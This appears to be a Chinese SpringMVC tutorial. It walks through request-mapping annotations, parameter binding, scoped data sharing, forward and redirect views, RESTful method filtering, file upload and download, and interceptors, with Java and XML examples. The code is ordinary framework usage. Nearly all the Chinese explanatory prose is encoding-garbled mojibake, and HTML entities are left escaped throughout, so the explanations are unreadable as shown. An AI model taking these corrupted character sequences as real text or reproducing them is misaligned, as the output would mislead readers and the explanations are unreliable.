\u0026lt;mvc:annotation-driven /\u0026gt; @RequestMappingæ ‡è¯†ä¸€ä¸ªç±»ï¼šè®¾ç½®æ˜ å°„è¯·æ±‚çš„è¯·æ±‚è·¯å¾„çš„åˆå§‹ä¿¡æ¯\n@RequestMappingæ ‡è¯†ä¸€ä¸ªæ–¹æ³•ï¼šè®¾ç½®æ˜ å°„è¯·æ±‚è¯·æ±‚è·¯å¾„çš„å…·ä½“ä¿¡æ¯\n1 2 3 4 5 6 7 8 9 10 @Controller @RequestMapping(\u0026#34;/test\u0026#34;) public class RequestMappingController { //æ­¤æ—¶è¯·æ±‚æ˜ å°„æ‰€æ˜ å°„çš„è¯·æ±‚çš„è¯·æ±‚è·¯å¾„ä¸ºï¼š/test/testRequestMapping @RequestMapping(\u0026#34;/testRequestMapping\u0026#34;) public String testRequestMapping(){ return \u0026#34;success\u0026#34;; } } @RequestMappingæ³¨è§£çš„methodå±æ€§é€šè¿‡è¯·æ±‚çš„è¯·æ±‚æ–¹å¼ï¼ˆgetæˆ–postï¼‰åŒ¹é…è¯·æ±‚æ˜ å°„\n@RequestMappingæ³¨è§£çš„methodå±æ€§æ˜¯ä¸€ä¸ªRequestMethodç±»å‹çš„æ•°ç»„ï¼Œè¡¨ç¤ºè¯¥è¯·æ±‚æ˜ å°„èƒ½å¤ŸåŒ¹é…å¤šç§è¯·æ±‚æ–¹å¼çš„è¯·æ±‚\nè‹¥å½“å‰è¯·æ±‚çš„è¯·æ±‚åœ°å€æ»¡è¶³è¯·æ±‚æ˜ å°„çš„valueå±æ€§ï¼Œä½†æ˜¯è¯·æ±‚æ–¹å¼ä¸æ»¡è¶³methodå±æ€§ï¼Œåˆ™æµè§ˆå™¨æŠ¥é”™405ï¼šRequest method 'POST' not supported\n@RequestMappingæ³¨è§£çš„paramså±æ€§é€šè¿‡è¯·æ±‚çš„è¯·æ±‚å‚æ•°åŒ¹é…è¯·æ±‚æ˜ å°„\n@RequestMappingæ³¨è§£çš„paramså±æ€§æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„æ•°ç»„ï¼Œå¯ä»¥é€šè¿‡å››ç§è¡¨è¾¾å¼è®¾ç½®è¯·æ±‚å‚æ•°å’Œè¯·æ±‚æ˜ å°„çš„åŒ¹é…å…³ç³»\n\u0026quot;param\u0026quot;ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»æºå¸¦paramè¯·æ±‚å‚æ•° \u0026quot;!param\u0026quot;ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»ä¸èƒ½æºå¸¦paramè¯·æ±‚å‚æ•° \u0026quot;param=value\u0026quot;ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»æºå¸¦paramè¯·æ±‚å‚æ•°ä¸”param=value \u0026quot;param!=value\u0026quot;ï¼šè¦æ±‚è¯·æ±‚æ˜ å°„æ‰€åŒ¹é…çš„è¯·æ±‚å¿…é¡»æºå¸¦paramè¯·æ±‚å‚æ•°ä½†æ˜¯param!=value SpringMVCæ”¯æŒanté£æ ¼çš„è·¯å¾„\nï¼Ÿï¼šè¡¨ç¤ºä»»æ„çš„å•ä¸ªå­—ç¬¦\n*ï¼šè¡¨ç¤ºä»»æ„çš„0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦\n**ï¼šè¡¨ç¤ºä»»æ„çš„ä¸€å±‚æˆ–å¤šå±‚ç›®å½•\nåªèƒ½ä½¿ç”¨/**/xxxçš„æ–¹å¼ RequestMappingå ä½ç¬¦çš„ä½œç”¨\nSpringMVCè·¯å¾„ä¸­çš„å ä½ç¬¦å¸¸ç”¨äºRESTfulé£æ ¼ä¸­ï¼Œå½“è¯·æ±‚è·¯å¾„ä¸­å°†æŸäº›æ•°æ®é€šè¿‡è·¯å¾„çš„æ–¹å¼ä¼ è¾“åˆ°æœåŠ¡å™¨ä¸­ï¼Œå°±å¯ä»¥åœ¨ç›¸åº”çš„@RequestMappingæ³¨è§£çš„valueå±æ€§ä¸­é€šè¿‡å ä½ç¬¦{xxx}è¡¨ç¤ºä¼ è¾“çš„æ•°æ®ï¼Œåœ¨é€šè¿‡@PathVariableæ³¨è§£ï¼Œå°†å ä½ç¬¦æ‰€è¡¨ç¤ºçš„æ•°æ®èµ‹å€¼ç»™æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚\n1 2 3 4 5 6 @RequestMapping(\u0026#34;/testRest/{id}/{username}\u0026#34;) public String testRest(@PathVariable(\u0026#34;id\u0026#34;) String id, @PathVariable(\u0026#34;username\u0026#34;) String username){ System.out.println(\u0026#34;id:\u0026#34;+id+\u0026#34;,username:\u0026#34;+username); return \u0026#34;success\u0026#34;; } //æœ€ç»ˆè¾“å‡ºçš„å†…å®¹ä¸º--\u0026gt;id:1,username:admin 2.2 @RequestParam @RequestParamæ˜¯å°†è¯·æ±‚å‚æ•°å’Œæ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚åˆ›å»ºæ˜ å°„å…³ç³» @RequestParamæ³¨è§£ä¸€å…±æœ‰ä¸‰ä¸ªå±æ€§ï¼š valueï¼šæŒ‡å®šä¸ºå½¢å‚èµ‹å€¼çš„è¯·æ±‚å‚æ•°çš„å‚æ•°å requiredï¼šè®¾ç½®æ˜¯å¦å¿…é¡»ä¼ è¾“æ­¤è¯·æ±‚å‚æ•°ï¼Œé»˜è®¤å€¼ä¸ºtrue è‹¥è®¾ç½®ä¸ºtrueæ—¶ï¼Œåˆ™å½“å‰è¯·æ±‚å¿…é¡»ä¼ è¾“valueæ‰€æŒ‡å®šçš„è¯·æ±‚å‚æ•°ï¼Œè‹¥æ²¡æœ‰ä¼ è¾“è¯¥è¯·æ±‚å‚æ•°ï¼Œä¸”æ²¡æœ‰è®¾ç½®defaultValueå±æ€§ï¼Œåˆ™é¡µé¢æŠ¥é”™400ï¼šRequired String parameter 'xxx' is not presentï¼›è‹¥è®¾ç½®ä¸ºfalseï¼Œåˆ™å½“å‰è¯·æ±‚ä¸æ˜¯å¿…é¡»ä¼ è¾“valueæ‰€æŒ‡å®šçš„è¯·æ±‚å‚æ•°ï¼Œè‹¥æ²¡æœ‰ä¼ è¾“ï¼Œåˆ™æ³¨è§£æ‰€æ ‡è¯†çš„å½¢å‚çš„å€¼ä¸ºnull defaultValueï¼šä¸ç®¡requiredå±æ€§å€¼ä¸ºtrueæˆ–falseï¼Œå½“valueæ‰€æŒ‡å®šçš„è¯·æ±‚å‚æ•°æ²¡æœ‰ä¼ è¾“æˆ–ä¼ è¾“çš„å€¼ä¸º\u0026quot;\u0026ldquo;æ—¶ï¼Œåˆ™ä½¿ç”¨é»˜è®¤å€¼ä¸ºå½¢å‚èµ‹å€¼ ä½œç”¨å®é™…å°±æ˜¯æŒ‡å®šéœ€è¦ä¼ å…¥çš„å‚æ•°å¹¶è·å–ã€‚ 2.3 @RequestHeader @RequestHeaderæ˜¯å°†è¯·æ±‚å¤´ä¿¡æ¯å’Œæ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚åˆ›å»ºæ˜ å°„å…³ç³» @RequestHeaderæ³¨è§£ä¸€å…±æœ‰ä¸‰ä¸ªå±æ€§ï¼švalueã€requiredã€defaultValueï¼Œç”¨æ³•åŒ@RequestParam è·å–è¯·æ±‚å¤´çš„ä¿¡æ¯ 2.4 @CookieValue @CookieValueæ˜¯å°†cookieæ•°æ®å’Œæ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚åˆ›å»ºæ˜ å°„å…³ç³» @CookieValueæ³¨è§£ä¸€å…±æœ‰ä¸‰ä¸ªå±æ€§ï¼švalueã€requiredã€defaultValueï¼Œç”¨æ³•åŒ@RequestParam ä½œç”¨ä¸ºè·å–cookieçš„ä¿¡æ¯ã€‚ 2.5@RequestBody @RequestBodyå¯ä»¥è·å–è¯·æ±‚ä½“ï¼Œéœ€è¦åœ¨æ§åˆ¶å™¨æ–¹æ³•è®¾ç½®ä¸€ä¸ªå½¢å‚ï¼Œä½¿ç”¨@RequestBodyè¿›è¡Œæ ‡è¯†ï¼Œå½“å‰è¯·æ±‚çš„è¯·æ±‚ä½“å°±ä¼šä¸ºå½“å‰æ³¨è§£æ‰€æ ‡è¯†çš„å½¢å‚èµ‹å€¼\nå³è·å–ä¼ è¾“è¿‡æ¥çš„è¯·æ±‚ä½“éƒ¨åˆ† 1 2 3 4 5 6 // æ¯”å¦‚ä¼ è¾“çš„ username=admin password=123456 @RequestMapping(\u0026#34;/testRequestBody\u0026#34;) public String testRequestBody(@RequestBody String requestBody){ System.out.println(\u0026#34;requestBody:\u0026#34;+requestBody); return \u0026#34;success\u0026#34;; } åˆ™è¾“å‡ºç»“æœä¸ºï¼šrequestBody:username=admin\u0026amp;password=123456 RequestEntityå°è£…è¯·æ±‚æŠ¥æ–‡çš„ä¸€ç§ç±»å‹ï¼Œéœ€è¦åœ¨æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚ä¸­è®¾ç½®è¯¥ç±»å‹çš„å½¢å‚ï¼Œå½“å‰è¯·æ±‚çš„è¯·æ±‚æŠ¥æ–‡å°±ä¼šèµ‹å€¼ç»™è¯¥å½¢å‚ï¼Œå¯ä»¥é€šè¿‡getHeaders()è·å–è¯·æ±‚å¤´ä¿¡æ¯ï¼Œé€šè¿‡getBody()è·å–è¯·æ±‚ä½“ä¿¡æ¯\n1 2 requestHeader:[host:\u0026#34;localhost:8080\u0026#34;, connection:\u0026#34;keep-alive\u0026#34;, content-length:\u0026#34;27\u0026#34;, cache-control:\u0026#34;max-age=0\u0026#34;, sec-ch-ua:\u0026#34;\u0026#34; Not A;Brand\u0026#34;;v=\u0026#34;99\u0026#34;, \u0026#34;Chromium\u0026#34;;v=\u0026#34;90\u0026#34;, \u0026#34;Google Chrome\u0026#34;;v=\u0026#34;90\u0026#34;\u0026#34;, sec-ch-ua-mobile:\u0026#34;?0\u0026#34;, upgrade-insecure-requests:\u0026#34;1\u0026#34;, origin:\u0026#34;http://localhost:8080\u0026#34;, user-agent:\u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\u0026#34;] requestBody:username=admin\u0026amp;password=123 2.6@ResponseBody @ResponseBodyç”¨äºæ ‡è¯†ä¸€ä¸ªæ§åˆ¶å™¨æ–¹æ³•ï¼Œå¯ä»¥å°†è¯¥æ–¹æ³•çš„è¿”å›å€¼ç›´æ¥ä½œä¸ºå“åº”æŠ¥æ–‡çš„å“åº”ä½“å“åº”åˆ°æµè§ˆå™¨\n1 2 3 4 5 @RequestMapping(\u0026#34;/testResponseBody\u0026#34;) @ResponseBody public String testResponseBody(){ return \u0026#34;success\u0026#34;; } ç»“æœï¼šæµè§ˆå™¨é¡µé¢æ˜¾ç¤ºå­—ç¬¦ä¸²success 2.7@RestController @RestControlleræ³¨è§£æ˜¯springMVCæä¾›çš„ä¸€ä¸ªå¤åˆæ³¨è§£ï¼Œæ ‡è¯†åœ¨æ§åˆ¶å™¨çš„ç±»ä¸Šï¼Œå°±ç›¸å½“äºä¸ºç±»æ·»åŠ äº†@Controlleræ³¨è§£ï¼Œå¹¶ä¸”ä¸ºå…¶ä¸­çš„æ¯ä¸ªæ–¹æ³•æ·»åŠ äº†@ResponseBodyæ³¨è§£ 3 SpirngMVCè·å–å‚æ•° ServletAPIè·å–:request.getParameter(\u0026quot;xx\u0026quot;);\n1 2 3 4 5 6 7 @RequestMapping(\u0026#34;/testParam\u0026#34;) public String testParam(HttpServletRequest request){ String username = request.getParameter(\u0026#34;username\u0026#34;); String password = request.getParameter(\u0026#34;password\u0026#34;); System.out.println(\u0026#34;username:\u0026#34;+username+\u0026#34;,password:\u0026#34;+password); return \u0026#34;success\u0026#34;; } é€šè¿‡æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚è·å–è¯·æ±‚å‚æ•°\nåœ¨æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚ä½ç½®ï¼Œè®¾ç½®å’Œè¯·æ±‚å‚æ•°åŒåçš„å½¢å‚ï¼Œå½“æµè§ˆå™¨å‘é€è¯·æ±‚ï¼ŒåŒ¹é…åˆ°è¯·æ±‚æ˜ å°„æ—¶ï¼Œåœ¨DispatcherServletä¸­å°±ä¼šå°†è¯·æ±‚å‚æ•°èµ‹å€¼ç»™ç›¸åº”çš„å½¢å‚\n1 \u0026lt;a th:href=\u0026#34;@{/testParam(username=\u0026#39;admin\u0026#39;,password=123456)}\u0026#34;\u0026gt;æµ‹è¯•è·å–è¯·æ±‚å‚æ•°--\u0026gt;/testParam\u0026lt;/a\u0026gt;\u0026lt;br\u0026gt; 1 2 3 4 5 @RequestMapping(\u0026#34;/testParam\u0026#34;) public String testParam(String username, String password){ System.out.println(\u0026#34;username:\u0026#34;+username+\u0026#34;,password:\u0026#34;+password); return \u0026#34;success\u0026#34;; } å¦‚æœåŒåçš„å‚æ•°è¿‡å¤šï¼Œå¯ä»¥å°†å…¶è®¾ç½®ä¸ºæ•°ç»„ï¼Œè¿™æ ·æ•°ç»„å†…çš„æ¯ä¸€ä¸ªå…ƒç´ å‡ä¸ºæ•°æ®ï¼Œå¦‚æœä¸è®¾ç½®æ•°ç»„ï¼Œåˆ™å­—ç¬¦å°†ä¼ å…¥çš„æ•°æ®ç”¨,è¿›è¡Œåˆ†éš”\né€šè¿‡POJOè·å–è¯·æ±‚å‚æ•°\nåœ¨æ§åˆ¶å™¨æ–¹æ³•çš„å½¢å‚ä½ç½®è®¾ç½®ä¸€ä¸ªå®ä½“ç±»ç±»å‹çš„å½¢å‚ï¼Œæ­¤æ—¶è‹¥æµè§ˆå™¨ä¼ è¾“çš„è¯·æ±‚å‚æ•°çš„å‚æ•°åå’Œå®ä½“ç±»ä¸­çš„å±æ€§åä¸€è‡´ï¼Œé‚£ä¹ˆè¯·æ±‚å‚æ•°å°±ä¼šä¸ºæ­¤å±æ€§èµ‹å€¼\nç±»Userä¸­çš„å±æ€§åå¯¹åº”æäº¤çš„æ•°æ® 1 2 3 4 5 6 @RequestMapping(\u0026#34;/testpojo\u0026#34;) public String testPOJO(User user){ System.out.println(user); return \u0026#34;success\u0026#34;; } //æœ€ç»ˆç»“æœ--\u0026gt;User{id=null, username=\u0026#39;å¼ ä¸‰\u0026#39;, password=\u0026#39;123\u0026#39;, age=23, sex=\u0026#39;ç”·\u0026#39;, email=\u0026#39;123@qq.com\u0026#39;} è§£å†³ä¹±ç é—®é¢˜\nå¯ä»¥åœ¨web.xmlé‡Œé¢æ³¨å†Œç¼–ç è¿‡æ»¤å™¨CharacterEncodingFilterï¼Œå…·ä½“æ“ä½œè¯¦æƒ…æŸ¥çœ‹ä¸Šè¿°çš„web.xmlæ–‡ä»¶ SpringMVCä¸­å¤„ç†ç¼–ç çš„è¿‡æ»¤å™¨ä¸€å®šè¦é…ç½®åˆ°å…¶ä»–è¿‡æ»¤å™¨ä¹‹å‰ï¼Œå¦åˆ™æ— æ•ˆ 4 åŸŸå¯¹è±¡å…±äº«æ•°æ® 4.1 requeståŸŸ ä½¿ç”¨ServletAPIå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n1 2 3 4 5 @RequestMapping(\u0026#34;/testServletAPI\u0026#34;) public String testServletAPI(HttpServletRequest request){ request.setAttribute(\u0026#34;testScope\u0026#34;, \u0026#34;hello,servletAPI\u0026#34;); return \u0026#34;success\u0026#34;; } ä½¿ç”¨ModelAndViewå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 @RequestMapping(\u0026#34;/testModelAndView\u0026#34;) public ModelAndView testModelAndView(){ /** * ModelAndViewæœ‰Modelå’ŒViewçš„åŠŸèƒ½ * Modelä¸»è¦ç”¨äºå‘è¯·æ±‚åŸŸå…±äº«æ•°æ® * Viewä¸»è¦ç”¨äºè®¾ç½®è§†å›¾ï¼Œå®ç°é¡µé¢è·³è½¬ */ ModelAndView mav = new ModelAndView(); //å‘è¯·æ±‚åŸŸå…±äº«æ•°æ® mav.addObject(\u0026#34;testScope\u0026#34;, \u0026#34;hello,ModelAndView\u0026#34;); //è®¾ç½®è§†å›¾ï¼Œå®ç°é¡µé¢è·³è½¬ mav.setViewName(\u0026#34;success\u0026#34;); return mav; } ä½¿ç”¨Modelå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\nmodelæ–¹å¼ç”¨çš„æ¯”è¾ƒå¤š 1 2 3 4 5 @RequestMapping(\u0026#34;/testModel\u0026#34;) public String testModel(Model model){ model.addAttribute(\u0026#34;testScope\u0026#34;, \u0026#34;hello,Model\u0026#34;); return \u0026#34;success\u0026#34;; } ä½¿ç”¨mapå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n1 2 3 4 5 @RequestMapping(\u0026#34;/testMap\u0026#34;) public String testMap(Map\u0026lt;String, Object\u0026gt; map){ map.put(\u0026#34;testScope\u0026#34;, \u0026#34;hello,Map\u0026#34;); return \u0026#34;success\u0026#34;; } ä½¿ç”¨ModelMapå‘requeståŸŸå¯¹è±¡å…±äº«æ•°æ®\n1 2 3 4 5 @RequestMapping(\u0026#34;/testModelMap\u0026#34;) public String testModelMap(ModelMap modelMap){ modelMap.addAttribute(\u0026#34;testScope\u0026#34;, \u0026#34;hello,ModelMap\u0026#34;); return \u0026#34;success\u0026#34;; } Modelã€ModelMapã€Mapçš„å…³ç³»\n1 2 3 4 public interface Model{} public class ModelMap extends LinkedHashMap\u0026lt;String, Object\u0026gt; {} public class ExtendedModelMap extends ModelMap implements Model {} public class BindingAwareModelMap extends ExtendedModelMap {} 4.2 sessionåŸŸ ç›´æ¥ä½¿ç”¨HttpSession\n1 2 3 4 5 @RequestMapping(\u0026#34;/testSession\u0026#34;) public String testSession(HttpSession session){ session.setAttribute(\u0026#34;testSessionScope\u0026#34;, \u0026#34;hello,session\u0026#34;); return \u0026#34;success\u0026#34;; } 4.3 applicationåŸŸ é€šè¿‡ServletContext application = session.getServletContext();æ¥æ·»åŠ å¯¹åº”çš„æ•°æ®\n1 2 3 4 5 6 @RequestMapping(\u0026#34;/testApplication\u0026#34;) public String testApplication(HttpSession session){ ServletContext application = session.getServletContext(); application.setAttribute(\u0026#34;testApplicationScope\u0026#34;, \u0026#34;hello,application\u0026#34;); return \u0026#34;success\u0026#34;; } 5 è§†å›¾ SpringMVCä¸­çš„è§†å›¾æ˜¯Viewæ¥å£ï¼Œè§†å›¾çš„ä½œç”¨æ¸²æŸ“æ•°æ®ï¼Œå°†æ¨¡å‹Modelä¸­çš„æ•°æ®å±•ç¤ºç»™ç”¨æˆ·\nSpringMVCè§†å›¾çš„ç§ç±»å¾ˆå¤šï¼Œé»˜è®¤æœ‰è½¬å‘è§†å›¾å’Œé‡å®šå‘è§†å›¾\nè§†å›¾æ­¥éª¤\nå½“æ§åˆ¶å™¨æ–¹æ³•ä¸­æ‰€è®¾ç½®çš„è§†å›¾åç§°æ²¡æœ‰ä»»ä½•å‰ç¼€æ—¶ï¼Œæ­¤æ—¶çš„è§†å›¾åç§°ä¼šè¢«SpringMVCé…ç½®æ–‡ä»¶ä¸­æ‰€é…ç½®çš„è§†å›¾è§£æå™¨è§£æï¼Œè§†å›¾åç§°æ‹¼æ¥è§†å›¾å‰ç¼€å’Œè§†å›¾åç¼€æ‰€å¾—åˆ°çš„æœ€ç»ˆè·¯å¾„ï¼Œä¼šé€šè¿‡è½¬å‘çš„æ–¹å¼å®ç°è·³è½¬\nè¿™é‡Œä»¥thymeleafä¸ºä¾‹\n1 2 3 4 @RequestMapping(\u0026#34;/testHello\u0026#34;) public String testHello(){ return \u0026#34;hello\u0026#34;; } å½“æ§åˆ¶å™¨æ–¹æ³•ä¸­æ‰€è®¾ç½®çš„è§†å›¾åç§°ä»¥\u0026quot;forward:\u0026quot;ä¸ºå‰ç¼€æ—¶ï¼Œåˆ›å»ºInternalResourceViewè§†å›¾ï¼Œæ­¤æ—¶çš„è§†å›¾åç§°ä¸ä¼šè¢«SpringMVCé…ç½®æ–‡ä»¶ä¸­æ‰€é…ç½®çš„è§†å›¾è§£æå™¨è§£æï¼Œè€Œæ˜¯ä¼šå°†å‰ç¼€\u0026quot;forward:\u0026quot;å»æ‰ï¼Œå‰©ä½™éƒ¨åˆ†ä½œä¸ºæœ€ç»ˆè·¯å¾„é€šè¿‡è½¬å‘çš„æ–¹å¼å®ç°è·³è½¬\n1 2 3 4 @RequestMapping(\u0026#34;/testForward\u0026#34;) public String testForward(){ return \u0026#34;forward:/testHello\u0026#34;; } å½“æ§åˆ¶å™¨æ–¹æ³•ä¸­æ‰€è®¾ç½®çš„è§†å›¾åç§°ä»¥\u0026quot;redirect:\u0026quot;ä¸ºå‰ç¼€æ—¶ï¼Œåˆ›å»ºRedirectViewè§†å›¾ï¼Œæ­¤æ—¶çš„è§†å›¾åç§°ä¸ä¼šè¢«SpringMVCé…ç½®æ–‡ä»¶ä¸­æ‰€é…ç½®çš„è§†å›¾è§£æå™¨è§£æï¼Œè€Œæ˜¯ä¼šå°†å‰ç¼€\u0026quot;redirect:\u0026quot;å»æ‰ï¼Œå‰©ä½™éƒ¨åˆ†ä½œä¸ºæœ€ç»ˆè·¯å¾„é€šè¿‡é‡å®šå‘çš„æ–¹å¼å®ç°è·³è½¬\n1 2 3 4 @RequestMapping(\u0026#34;/testRedirect\u0026#34;) public String testRedirect(){ return \u0026#34;redirect:/testHello\u0026#34;; } 6 Restful å®ƒä»¬åˆ†åˆ«å¯¹åº”å››ç§åŸºæœ¬æ“ä½œï¼šGET ç”¨æ¥è·å–èµ„æºï¼ŒPOST ç”¨æ¥æ–°å»ºèµ„æºï¼ŒPUT ç”¨æ¥æ›´æ–°èµ„æºï¼ŒDELETE ç”¨æ¥åˆ é™¤èµ„æºã€‚\nREST é£æ ¼æå€¡ URL åœ°å€ä½¿ç”¨ç»Ÿä¸€çš„é£æ ¼è®¾è®¡ï¼Œä»å‰åˆ°åå„ä¸ªå•è¯ä½¿ç”¨æ–œæ åˆ†å¼€ï¼Œä¸ä½¿ç”¨é—®å·é”®å€¼å¯¹æ–¹å¼æºå¸¦è¯·æ±‚å‚æ•°ï¼Œè€Œæ˜¯å°†è¦å‘é€ç»™æœåŠ¡å™¨çš„æ•°æ®ä½œä¸º URL åœ°å€çš„ä¸€éƒ¨åˆ†ï¼Œä»¥ä¿è¯æ•´ä½“é£æ ¼çš„ä¸€è‡´æ€§ã€‚\næ“ä½œ ä¼ ç»Ÿæ–¹å¼ RESTé£æ ¼ æŸ¥è¯¢æ“ä½œ getUserById?id=1 user/1\u0026ndash;\u0026gt;getè¯·æ±‚æ–¹å¼ ä¿å­˜æ“ä½œ saveUser user\u0026ndash;\u0026gt;postè¯·æ±‚æ–¹å¼ åˆ é™¤æ“ä½œ deleteUser?id=1 user/1\u0026ndash;\u0026gt;deleteè¯·æ±‚æ–¹å¼ æ›´æ–°æ“ä½œ updateUser user\u0026ndash;\u0026gt;putè¯·æ±‚æ–¹å¼ SpringMVCç»™äºˆè§£å†³æ–¹æ¡ˆ\nSpringMVC æä¾›äº† HiddenHttpMethodFilter å¸®åŠ©æˆ‘ä»¬å°† POST è¯·æ±‚è½¬æ¢ä¸º DELETE æˆ– PUT è¯·æ±‚\nå½“å‰è¯·æ±‚çš„è¯·æ±‚æ–¹å¼å¿…é¡»ä¸ºpost å½“å‰è¯·æ±‚å¿…é¡»ä¼ è¾“è¯·æ±‚å‚æ•°_method åœ¨web.xmlé‡Œé¢æ‰¾æ³¨å†Œ\n1 2 3 4 5 6 7 8 \u0026lt;filter\u0026gt; \u0026lt;filter-name\u0026gt;HiddenHttpMethodFilter\u0026lt;/filter-name\u0026gt; \u0026lt;filter-class\u0026gt;org.springframework.web.filter.HiddenHttpMethodFilter\u0026lt;/filter-class\u0026gt; \u0026lt;/filter\u0026gt; \u0026lt;filter-mapping\u0026gt; \u0026lt;filter-name\u0026gt;HiddenHttpMethodFilter\u0026lt;/filter-name\u0026gt; \u0026lt;url-pattern\u0026gt;/*\u0026lt;/url-pattern\u0026gt; \u0026lt;/filter-mapping\u0026gt; å¯¹åº”æäº¤è¿‡æ¥çš„è¯·æ±‚ä¸­åº”è¯¥åŒ…å«å‚æ•°\nå‚æ•°åï¼š_method value:PUT or DELETE ä¼ è¾“çš„è¯·æ±‚æ–¹å¼å¿…é¡»ä¸ºPOST 7 æ–‡ä»¶ä¸Šä¼ ä¸‹è½½ æ–‡ä»¶ä¸‹è½½\nä½¿ç”¨ResponseEntityå®ç°ä¸‹è½½æ–‡ä»¶çš„åŠŸèƒ½\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 // å®é™…ä½¿ç”¨çš„æ—¶å€™ï¼Œå°†éœ€è¦ä¸‹è½½çš„è·¯å¾„ä½œä¸ºå‚æ•°ä¼ é€’å³å¯ @RequestMapping(\u0026#34;/testDown\u0026#34;) public ResponseEntity\u0026lt;byte[]\u0026gt; testResponseEntity(HttpSession session) throws IOException { //è·å–ServletContextå¯¹è±¡ ServletContext servletContext = session.getServletContext(); //è·å–æœåŠ¡å™¨ä¸­æ–‡ä»¶çš„çœŸå®è·¯å¾„ String realPath = servletContext.getRealPath(\u0026#34;/static/img/1.jpg\u0026#34;); //åˆ›å»ºè¾“å…¥æµ InputStream is = new FileInputStream(realPath); //åˆ›å»ºå­—èŠ‚æ•°ç»„ byte[] bytes = new byte[is.available()]; //å°†æµè¯»åˆ°å­—èŠ‚æ•°ç»„ä¸­ is.read(bytes); //åˆ›å»ºHttpHeaderså¯¹è±¡è®¾ç½®å“åº”å¤´ä¿¡æ¯ MultiValueMap\u0026lt;String, String\u0026gt; headers = new HttpHeaders(); //è®¾ç½®è¦ä¸‹è½½æ–¹å¼ä»¥åŠä¸‹è½½æ–‡ä»¶çš„åå­— headers.add(\u0026#34;Content-Disposition\u0026#34;, \u0026#34;attachment;filename=1.jpg\u0026#34;); //è®¾ç½®å“åº”çŠ¶æ€ç  HttpStatus statusCode = HttpStatus.OK; //åˆ›å»ºResponseEntityå¯¹è±¡ ResponseEntity\u0026lt;byte[]\u0026gt; responseEntity = new ResponseEntity\u0026lt;\u0026gt;(bytes, headers, statusCode); //å…³é—­è¾“å…¥æµ is.close(); return responseEntity; } æ–‡ä»¶ä¸Šä¼ \næ–‡ä»¶ä¸Šä¼ è¦æ±‚formè¡¨å•çš„è¯·æ±‚æ–¹å¼å¿…é¡»ä¸ºpostï¼Œå¹¶ä¸”æ·»åŠ å±æ€§enctype=\u0026quot;multipart/form-data\u0026quot;\nSpringMVCä¸­å°†ä¸Šä¼ çš„æ–‡ä»¶å°è£…åˆ°MultipartFileå¯¹è±¡ä¸­ï¼Œé€šè¿‡æ­¤å¯¹è±¡å¯ä»¥è·å–æ–‡ä»¶ç›¸å…³ä¿¡æ¯\næ­¥éª¤\næ·»åŠ ä¾èµ–\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/commons-fileupload/commons-fileupload --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-fileupload\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-fileupload\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.3.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; åœ¨SpringMVC.xmlé‡Œé¢æ³¨å†Œç»„ä»¶\n1 2 \u0026lt;!--å¿…é¡»é€šè¿‡æ–‡ä»¶è§£æå™¨çš„è§£ææ‰èƒ½å°†æ–‡ä»¶è½¬æ¢ä¸ºMultipartFileå¯¹è±¡--\u0026gt; \u0026lt;bean id=\u0026#34;multipartResolver\u0026#34; class=\u0026#34;org.springframework.web.multipart.commons.CommonsMultipartResolver\u0026#34;\u0026gt;\u0026lt;/bean\u0026gt; å®é™…æ–¹æ³•\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @RequestMapping(\u0026#34;/testUp\u0026#34;) public String testUp(MultipartFile photo, HttpSession session) throws IOException { //è·å–ä¸Šä¼ çš„æ–‡ä»¶çš„æ–‡ä»¶å String fileName = photo.getOriginalFilename(); //å¤„ç†æ–‡ä»¶é‡åé—®é¢˜ String hzName = fileName.substring(fileName.lastIndexOf(\u0026#34;.\u0026#34;)); fileName = UUID.randomUUID().toString() + hzName; //è·å–æœåŠ¡å™¨ä¸­photoç›®å½•çš„è·¯å¾„ ServletContext servletContext = session.getServletContext(); String photoPath = servletContext.getRealPath(\u0026#34;photo\u0026#34;); File file = new File(photoPath); if(!file.exists()){ file.mkdir(); } String finalPath = photoPath + File.separator + fileName; //å®ç°ä¸Šä¼ åŠŸèƒ½ photo.transferTo(new File(finalPath)); return \u0026#34;success\u0026#34;; } 8 æ‹¦æˆªå™¨ SpringMVCä¸­çš„æ‹¦æˆªå™¨æœ‰ä¸‰ä¸ªæŠ½è±¡æ–¹æ³•ï¼š preHandleï¼šæ§åˆ¶å™¨æ–¹æ³•æ‰§è¡Œä¹‹å‰æ‰§è¡ŒpreHandle()ï¼Œå…¶booleanç±»å‹çš„è¿”å›å€¼è¡¨ç¤ºæ˜¯å¦æ‹¦æˆªæˆ–æ”¾è¡Œï¼Œè¿”å›trueä¸ºæ”¾è¡Œï¼Œå³è°ƒç”¨æ§åˆ¶å™¨æ–¹æ³•ï¼›è¿”å›falseè¡¨ç¤ºæ‹¦æˆªï¼Œå³ä¸è°ƒç”¨æ§åˆ¶å™¨æ–¹æ³• 